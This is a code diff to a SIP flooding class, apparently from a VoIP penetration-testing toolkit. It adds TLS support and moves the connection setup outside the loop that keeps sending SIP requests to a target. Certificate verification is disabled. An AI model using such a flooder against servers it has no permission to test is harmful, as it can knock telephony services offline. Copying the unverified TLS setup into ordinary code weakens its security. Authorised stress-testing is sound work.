@@ -55,7 +55,7 @@ class SipFlood:
         self.run = True
 
     def start(self):
-        supported_protos = ['UDP', 'TCP']
+        supported_protos = ['UDP', 'TCP', 'TLS']
         supported_methods = ['REGISTER', 'SUBSCRIBE', 'NOTIFY', 'PUBLISH', 'MESSAGE', 'INVITE',
                              'OPTIONS', 'ACK', 'CANCEL', 'BYE', 'PRACK', 'INFO', 'REFER', 'UPDATE']
 
@@ -64,13 +64,17 @@ class SipFlood:
         if not self.verbose:
             self.verbose = '0'
 
+        # if rport is by default but we want to scan TLS protocol, use port 5061
+        if self.rport == 5060 and self.proto == 'TLS':
+            self.rport = 5061
+
         # check method
         if self.method not in supported_methods:
             print(BRED + 'Method %s is not supported' % self.method)
             sys.exit()
 
         # check protocol
-        if self.proto != 'ALL' and self.proto not in supported_protos:
+        if self.proto not in supported_protos:
             print(BRED + 'Protocol %s is not supported' % self.proto)
             sys.exit()
 
@@ -129,17 +133,23 @@ class SipFlood:
         line = ['-', '\\', '|', '/']
         pos = 0
 
+        try:
+            sock.settimeout(1)
+
+            if self.proto == 'TCP':
+                sock.connect(host)
+
+            if self.proto == 'TLS':
+                sock_ssl = ssl.wrap_socket(
+                    sock, ssl_version=ssl.PROTOCOL_TLS, ciphers=None, cert_reqs=ssl.CERT_NONE)
+                sock_ssl.connect(host)
+        except:
+            print('Socket connection error')
+            exit()
+
         while self.run == True:
             try:
-                sock.settimeout(1)
-
-                if self.proto == 'TCP':
-                    sock.connect(host)
-
                 if self.proto == 'TLS':
-                    sock_ssl = ssl.wrap_socket(
-                        sock, ssl_version=ssl.PROTOCOL_TLS, ciphers=None, cert_reqs=ssl.CERT_NONE)
-                    sock_ssl.connect(host)
                     sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
                 else:
                     sock.sendto(bytes(msg[:8192], 'utf-8'), host)
